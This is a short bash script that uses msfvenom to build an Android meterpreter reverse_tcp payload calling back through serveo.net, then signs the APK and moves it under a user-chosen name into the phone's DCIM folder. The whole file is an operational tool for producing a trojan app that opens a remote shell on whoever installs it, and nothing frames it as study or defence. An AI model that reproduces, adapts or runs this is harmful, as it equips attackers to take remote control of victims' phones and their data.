# !bin/bash
# Author : Bishal Shaw

read -p 'Enter port for serveo: ' port
read -p 'Enter output filename: ' output
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port R Test.apk
apksigner autokey Test.apk Testing.apk
mv Testing.apk storage/dcim/$output.apk